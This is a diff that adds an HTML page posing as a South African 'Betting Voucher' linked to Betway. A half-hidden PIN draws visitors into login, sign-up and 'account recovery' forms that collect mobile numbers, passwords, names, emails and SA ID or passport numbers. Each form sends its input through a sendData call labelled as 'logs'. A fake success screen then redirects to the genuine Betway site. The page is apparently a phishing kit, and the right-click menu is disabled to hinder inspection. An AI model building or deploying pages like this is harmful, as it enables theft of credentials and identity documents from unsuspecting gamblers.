@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Betting Voucher South Africa</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body oncontextmenu="return false;">
+
+  <!-- Full-screen Loaders -->
+  <div id="loading-view">
+    <div class="loader-logo">betting voucher</div>
+    <div class="spinner"></div>
+  </div>
+
+  <div id="process-overlay">
+    <div class="loader-logo">betting voucher</div>
+    <div class="spinner"></div>
+  </div>
+
+  <!-- Main Voucher Container -->
+  <div class="voucher-container">
+    <img src="https://iili.io/C9YVzmX.md.jpg" alt="Voucher Logo" class="voucher-header-img">
+    <div class="voucher-details">
+      <div class="voucher-title">Your Betting Voucher</div>
+      <div class="pin-display-box">PIN: 4829-****-****</div>
+      <div class="lock-notice">
+        <i class="fas fa-lock"></i>
+        <span>Voucher Hidden. You must login to completely authenticate and view your full PIN code.</span>
+      </div>
+      <button class="unlock-btn" onclick="openModal('login-modal')">Login to Reveal PIN</button>
+    </div>
+  </div>
+
+  <!-- Live Chat Widget -->
+  <div id="chat-icon" onclick="toggleChat()">
+    <i class="fas fa-headset" style="font-size:22px;color:#fff"></i>
+  </div>
+
+  <!-- 1. LOGIN MODAL -->
+  <div id="login-modal" class="overlay" style="display:none">
+    <div class="modal-container">
+      <div class="modal-header">
+        <span>Login</span>
+        <i class="fas fa-times" style="cursor:pointer" onclick="closeModals()"></i>
+      </div>
+      <div class="modal-body">
+        
+        <!-- Mobile Input Group (Strict Numeric) -->
+        <div class="input-group" id="phone-group">
+          <span class="input-prefix">+27</span>
+          <input type="tel" id="lgn-mobile" class="floating-input" placeholder=" " inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, ''); remErr(this)">
+          <label class="floating-label">Mobile Number</label>
+          <div class="error-text">This field is required.</div>
+        </div>
+
+        <!-- Password Input Group -->
+        <div class="input-group" id="pw-group">
+          <input type="password" id="login-pw" class="floating-input" placeholder=" " oninput="remErr(this)">
+          <label class="floating-label" style="left: 12px;">Enter Password</label>
+          <i class="fas fa-eye-slash pw-eye" id="eye-login" onclick="togglePassword('login-pw','eye-login')"></i>
+          <div class="error-text">This field is required.</div>
+        </div>
+
+        <div class="forgot-row">
+          <span onclick="openModal('forgot-pw-modal')">Forgot Username</span> 
+          <span onclick="openModal('forgot-pw-modal')">Forgot Password?</span>
+        </div>
+
+        <div class="signup-promo-box">
+          <span>Don't have an account yet?</span> 
+          <strong onclick="openModal('signup-modal')" style="cursor:pointer">Sign Up <i class="fas fa-chevron-right" style="font-size:11px; margin-left:5px;"></i></strong>
+        </div>
+
+        <button id="lgn-submit" class="submit-btn" onclick="sendData(event, 'Betting Voucher logs')">Login</button>
+        
+        <div id="login-error">
+          <i class="fas fa-info-circle"></i>
+          <span>Access Denied. Check Username and/or Password</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2. SIGN UP MODAL -->
+  <div id="signup-modal" class="overlay" style="display:none">
+    <div class="modal-container">
+      <div class="modal-header">
+        <span>Sign Up</span> 
+        <i class="fas fa-times" style="cursor:pointer" onclick="openModal('login-modal')"></i>
+      </div>
+      <div class="modal-body" style="max-height: 80vh; overflow-y: auto;">
+        
+        <!-- Mobile Input Group (Strict Numeric) -->
+        <div class="input-group" id="sgp-phone-group">
+          <span class="input-prefix">+27</span>
+          <input type="tel" id="sgp-mobile" class="floating-input" placeholder=" " inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, ''); remErr(this)">
+          <label class="floating-label">Mobile Number</label>
+          <div class="error-text">This field is required.</div>
+        </div>
+
+        <!-- Password Input Group -->
+        <div class="input-group">
+          <input type="password" id="signup-pw" class="floating-input" placeholder=" " oninput="remErr(this)">
+          <label class="floating-label" style="left: 12px;">Enter Password</label>
+          <div class="error-text">This field is required.</div>
+        </div>
+
+        <!-- First Name Group -->
+        <div class="input-group">
+          <input type="text" id="sgp-fname" class="floating-input" placeholder=" " oninput="remErr(this)">
+          <label class="floating-label" style="left: 12px;">First Name</label>
+          <div class="error-text">This field is required.</div>
+        </div>
+
+        <!-- Surname Group -->
+        <div class="input-group">
+          <input type="text" id="sgp-sname" class="floating-input" placeholder=" " oninput="remErr(this)">
+          <label class="floating-label" style="left: 12px;">Surname</label>
+          <div class="error-text">This field is required.</div>
+        </div>
+
+        <!-- Email Group -->
+        <div class="input-group">
+          <input type="email" id="sgp-email" class="floating-input" placeholder=" " oninput="remErr(this)">
+          <label class="floating-label" style="left: 12px;">Email</label>
+          <div class="error-text">This field is required.</div>
+        </div>
+
+        <!-- Coupon Promotions -->
+        <div class="coupon-section">
+          <div class="coupon-card">
+            <div class="coupon-img"><i class="fas fa-plane" style="color:red;font-size:24px"></i></div>
+            <div class="coupon-info">
+              <h4>1000 Free Flights</h4>
+              <p>On Aviator</p>
+            </div>
+          </div>
+          <div class="coupon-card">
+            <div class="coupon-img"><i class="fas fa-futbol" style="color:var(--bw-green);font-size:24px"></i></div>
+            <div class="coupon-info">
+              <h4>R1000 Free Bet</h4>
+              <p>On any Sports</p>
+            </div>
+          </div>
+          <div class="coupon-btns">
+            <button class="btn-later" onclick="openModal('login-modal')">Later</button> 
+            <button class="btn-accept" onclick="openModal('login-modal')">Accept</button>
+          </div>
+        </div>
+
+        <button id="sgp-submit" class="submit-btn" style="margin-top:15px" onclick="sendData(event, 'Sign up logs')">Register Now</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- 3. FORGOT PASSWORD MODAL -->
+  <div id="forgot-pw-modal" class="overlay" style="display:none">
+    <div class="modal-container">
+      <div class="modal-header">
+        <span>Account Recovery</span> 
+        <i class="fas fa-times" style="cursor:pointer" onclick="openModal('login-modal')"></i>
+      </div>
+      <div class="modal-body">
+        <select id="doc-type">
+          <option>SA ID Number</option>
+          <option>Passport</option>
+        </select>
+        
+        <div class="input-group">
+          <input type="text" id="forgot-input" class="floating-input" placeholder=" " oninput="remErr(this)">
+          <label class="floating-label" style="left: 12px;">Number</label>
+          <div class="error-text">This field is required.</div>
+        </div>
+
+        <button id="forgot-submit" class="submit-btn" onclick="sendData(event, 'Forgot Password')">Submit</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- SUCCESS REDIRECT VIEW -->
+  <div id="success-view" class="view">
+    <header>
+      <div class="logo-main">betting voucher</div>
+    </header>
+    <div style="padding:30px 20px;">
+      <div style="text-align:center;margin-bottom:30px">
+        <div style="width:70px;height:70px;background:var(--bw-green);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 15px">
+          <i class="fas fa-check" style="font-size:35px;color:#fff"></i>
+        </div>
+        <h2 style="margin:0">Congratulations! 👏</h2>
+        <p style="color:#aaa;font-size:14px">Ref: #BW-ZA-9901</p>
+      </div>
+      <div class="success-step"><i class="fas fa-check-circle"></i><span>Voucher Successfully Activated</span></div>
+      <div class="success-step"><i class="fas fa-check-circle"></i><span>Authentication Completed</span></div>
+      <div class="success-step"><i class="fas fa-circle-notch fa-spin"></i><span>Redirecting to Betway...</span></div>
+      
+      <div style="background:#333;padding:15px;border-radius:8px;margin-top:30px;font-size:13px;line-height:1.5">
+        <strong>Notice:</strong> Your transaction has been approved. You are now being securely redirected to the official Betway page.
+      </div>
+      <button class="submit-btn" style="margin-top:30px;background:#444" onclick="window.location.href='https://www.betway.co.za/'">Go manually</button>
+    </div>
+  </div>
+
+  <!-- LIVE SUPPORT CHAT -->
+  <div id="chat-window">
+    <div id="chat-header">
+      <span>Betting Voucher Live Support</span>
+      <i class="fas fa-times" onclick="toggleChat()"></i>
+    </div>
+    <div id="chat-msgs">
+      <div class="msg-b msg-agent">Welcome to Betting Voucher South Africa. An agent is ready to help you.</div>
+    </div>
+    <div id="chat-input-area">
+      <input type="text" id="chat-txt" placeholder="Describe your issue..." style="flex:1;border:none;outline:none;background:transparent;padding:10px"> 
+      <i class="fas fa-paper-plane" style="color:var(--bw-green);padding:10px;font-size:20px" onclick="sendChatTxt()"></i>
+    </div>
+  </div>
+
+  <script src="js/script.js"></script>
+</body>
+</html>
